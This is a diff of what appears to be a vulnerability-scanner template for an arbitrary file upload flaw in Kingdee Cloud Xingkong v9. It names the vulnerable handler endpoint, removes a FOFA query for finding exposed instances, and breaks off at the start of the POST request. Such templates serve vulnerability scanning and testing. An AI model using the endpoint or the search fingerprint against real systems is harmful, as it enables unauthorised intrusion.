@@ -3,12 +3,8 @@ info:
   name: 金蝶云星空v9 CMKAppWebHandler存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nbw09v8b5m2iw2ae'
+  description: ''
   tags: file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nbw09v8b5m2iw2ae
-    fofa: app="金蝶云星空-管理中心" || title="金蝶云星空" || body="kdUtils.min.js" && body="金蝶云星空"
 http:
 - raw:
   - 'POST /K3CloudMiniApp/Silverlight/CMKAppWebHandler.ashx HTTP/1.1
